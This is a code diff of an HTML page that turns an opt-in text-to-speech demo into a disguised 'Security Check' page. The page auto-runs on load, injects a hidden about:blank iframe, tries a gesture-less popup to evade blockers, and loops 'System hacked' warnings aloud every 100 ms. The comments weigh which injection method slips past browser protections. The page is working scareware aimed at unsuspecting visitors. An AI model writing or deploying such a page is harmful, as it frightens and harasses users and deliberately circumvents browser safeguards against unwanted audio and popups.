@@ -3,34 +3,30 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Alert - TTS Loop</title>
+<title>Security Check</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #111; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
-  button { padding: 15px 30px; font-size: 18px; background: #e94560; color: #fff; border: none; border-radius: 6px; cursor: pointer; margin-top: 20px; font-weight: bold; }
-  button:hover { background: #c73650; }
+  body { background: #111; color: #0f0; font-family: monospace; overflow: hidden; }
   iframe { display: none; }
 </style>
 </head>
 <body>
 
-<h1>🔊 TTS Loop di about:blank</h1>
-<p>Klik tombol di bawah untuk memulai (membutuhkan 1 klik untuk gesture).</p>
-<button id="startBtn">Mulai TTS Loop</button>
-
 <script>
 (function () {
   'use strict';
 
+  console.log("[!] Memulai Zero-Click TTS Loop...");
+
   // ============================================
-  // KONTEN UNTUK ABOUT:BLANK (TTS Loop)
+  // KONTEN UNTUK ABOUT:BLANK (TTS LOOP)
   // ============================================
   var payloadHTML = `
     <!DOCTYPE html>
     <html>
     <head><title>Critical Alert</title></head>
     <body style="background:#000;color:#f00;font-family:monospace;text-align:center;padding-top:20vh;">
-      <h1>CRITICAL ALERT</h1>
+      <h1>SYSTEM COMPROMISED</h1>
       <p id="status">Memulai TTS Loop...</p>
       <script>
         (function() {
@@ -38,43 +34,28 @@
           var statusEl = document.getElementById('status');
 
           function speak() {
-            if (!('speechSynthesis' in window)) {
-              statusEl.innerText = "TTS Not Supported";
-              return;
-            }
+            if (!('speechSynthesis' in window)) return;
 
-            // Teks yang akan diulang-ulang
-            var text = "Warning. Your system has been compromised. This is an automated security alert. Loop number " + count;
-            
-            var u = new SpeechSynthesisUtterance(text);
+            var u = new SpeechSynthesisUtterance("Warning. System hacked. Loop number " + count);
             u.lang = 'en-US';
             u.rate = 1.0;
-            u.pitch = 1.0;
             u.volume = 1.0;
 
             u.onstart = function() {
               count++;
-              statusEl.innerText = "TTS Loop Berjalan: " + count;
-              console.log('[TTS] Speaking loop #' + count);
+              statusEl.innerText = "Loop: " + count;
             };
 
             u.onend = function() {
-              // JEDA 1 DETIK SEBELUM LOOP BERIKUTNYA
-              setTimeout(speak, 1000); 
-            };
-
-            u.onerror = function(e) {
-              console.log('[TTS] Error:', e.error);
-              // Coba lagi meskipun error
-              setTimeout(speak, 2000);
+              // LANGSUNG LOOP TANPA JEDA
+              setTimeout(speak, 100); 
             };
 
             window.speechSynthesis.speak(u);
           }
 
-          // Mulai loop
+          // Coba mulai TTS
           speak();
-
         })();
       <\/script>
     </body>
@@ -82,28 +63,61 @@
   `;
 
   // ============================================
-  // TRIGGER (MEMBUKA ABOUT:BLANK)
+  // METODE 1: IFRAME INJECTION (Sering Lolos)
   // ============================================
-  document.getElementById('startBtn').addEventListener('click', function() {
-    // Buka tab baru (about:blank)
+  function injectZeroClickIframe() {
+    var iframe = document.createElement('iframe');
+    iframe.allow = "autoplay";
+    iframe.style.display = "none";
+    iframe.src = 'about:blank';
+    document.body.appendChild(iframe);
+
+    iframe.onload = function() {
+      try {
+        var doc = iframe.contentDocument || iframe.contentWindow.document;
+        doc.open();
+        doc.write(payloadHTML);
+        doc.close();
+        console.log("[!] Payload TTS disuntikkan ke iframe about:blank.");
+      } catch(e) {
+        console.log("[X] Gagal inject iframe: " + e.message);
+      }
+    };
+  }
+
+  // ============================================
+  // METODE 2: WINDOW.OPEN POPUP (Zero-Click)
+  // ============================================
+  function forceZeroClickPopup() {
+    // Mencoba membuka tab baru tanpa klik
     var win = window.open('about:blank', '_blank');
     
     if (!win) {
-      alert("❌ Popup diblokir! Izinkan pop-up untuk melanjutkan.");
+      console.log("[X] Popup diblokir oleh browser (Transient Activation dibutuhkan).");
       return;
     }
 
     try {
-      // Tulis payload ke dalam tab about:blank
       win.document.open();
       win.document.write(payloadHTML);
       win.document.close();
-      console.log("[!] Payload TTS Loop disuntikkan ke about:blank.");
-    } catch (e) {
-      console.error("Gagal menulis ke about:blank:", e);
-      alert("Gagal menyuntikkan payload: " + e.message);
+      console.log("[!] Payload TTS disuntikkan ke Popup Window.");
+    } catch(e) {
+      console.log("[X] Gagal menulis ke popup: " + e.message);
     }
-  });
+  }
+
+  // ============================================
+  // EKSEKUSI (Zero-Click Trigger)
+  // ============================================
+  
+  // Coba Iframe (Biasanya berhasil tanpa memicu popup blocker)
+  injectZeroClickIframe();
+
+  // Coba Popup (Mungkin diblokir jika tidak ada gesture)
+  setTimeout(function() {
+    forceZeroClickPopup();
+  }, 1000);
 
 })();
 </script>
